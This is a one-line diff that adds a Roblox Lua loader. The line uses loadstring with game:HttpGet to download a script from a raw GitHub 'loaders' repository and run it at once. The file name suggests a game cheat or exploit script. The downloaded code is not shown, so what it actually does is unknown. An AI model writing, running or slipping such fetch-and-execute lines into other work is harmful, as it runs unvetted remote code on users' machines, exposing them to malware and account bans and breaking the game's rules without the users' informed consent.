@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandLobsterFill/loaders/main/loaders/fps-flick-spam2-szn3x9y9gfce5k.lua"))()
